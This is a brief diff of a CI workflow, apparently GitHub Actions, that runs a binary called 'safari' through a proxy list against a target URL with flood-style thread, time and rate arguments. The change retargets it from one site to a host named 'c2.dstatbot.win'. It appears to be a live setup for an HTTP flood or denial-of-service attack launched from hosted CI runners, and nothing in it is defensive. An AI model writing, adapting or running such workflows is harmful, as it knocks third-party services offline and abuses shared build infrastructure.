@@ -24,6 +24,6 @@ jobs:
         sudo apt-get update && sudo apt-get install -y dos2unix
         dos2unix safari proxies.txt
         chmod +x safari
-        ./safari https://xbossop.shop/register   700 10000 8000 proxy.txt --cdn --http
+        ./safari  https://c2.dstatbot.win/PlvBhjNM  700 10000 8000 proxy.txt --cdn --http
       continue-on-error: true
       
